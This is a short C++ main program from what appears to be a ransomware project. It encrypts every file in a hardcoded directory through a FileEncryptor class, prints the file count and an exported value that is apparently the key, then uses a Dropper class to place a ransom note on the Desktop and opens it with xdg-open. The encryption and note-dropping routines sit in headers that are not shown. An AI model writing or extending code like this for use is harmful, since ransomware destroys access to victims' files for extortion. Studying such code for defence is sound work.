#include <iostream>
#include <vector>
#include <string>

#include "file_encryptor.h"
#include "dropper.h"

using std::cout;
using std::endl;
using std::vector;
using std::string;

int main(int argc, char* args[]) {
  FileEncryptor encryptor;

  for (const auto& file : encryptor.ListDirectory("/home/aesophor/Temp")) {
    encryptor.Encrypt(file);
  }
  cout << "Totally encrypted: " << encryptor.count() << " files." << endl;
  cout << encryptor.Export() << endl;

  Dropper dropper("/home/aesophor/Desktop");
  dropper.DropNote();

  system("xdg-open /home/aesophor/Desktop/index.html");
  return EXIT_SUCCESS;
}
